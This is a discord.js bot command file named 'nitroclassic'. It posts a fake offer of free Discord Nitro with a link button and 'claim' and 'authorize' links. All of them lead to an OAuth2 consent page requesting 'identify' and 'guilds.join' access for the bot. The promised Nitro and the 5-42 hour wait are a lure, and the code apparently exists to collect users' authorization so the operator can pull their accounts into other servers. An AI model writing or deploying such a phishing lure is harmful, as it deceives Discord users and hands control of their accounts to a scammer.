const discord = require('discord.js')

const epic = require("../../epic")
const { EmbedBuilder, codeBlock } = require("@discordjs/builders");
const { Colors, ApplicationCommandOptionType, PermissionFlagsBits, ChatInputCommandInteraction } = require("discord.js");
const { ApplicationCommandType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
module.exports = {
  name: "nitroclassic",
  description: "nitro classic",
  default_permission: true,
  timeout: 3000,
  category: "whitelist",
 userPerms: [discord.PermissionFlagsBits.SendMessages],
  ownerOnly: false,

  run: async (client, interaction, args) => {
  const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setLabel(`Accept`)
      .setStyle(ButtonStyle.Link)
     .setURL(`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`)
          )
  interaction.deferReply();
  interaction.deleteReply();
  interaction.channel.send({embeds: [new discord.EmbedBuilder().setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`}) button.
\n2️⃣Click on the [**__authorize__**](${`https://discord.com/oauth2/authorize?client_id=${epic.client_id}&redirect_uri=${epic.redirect_uri}&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%22${interaction.guild.id}%22%2C%22bot%22%3A%22${epic.client_id}%22%7D`})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
        .setColor("#7289da")], components: [row]})


    
  }
}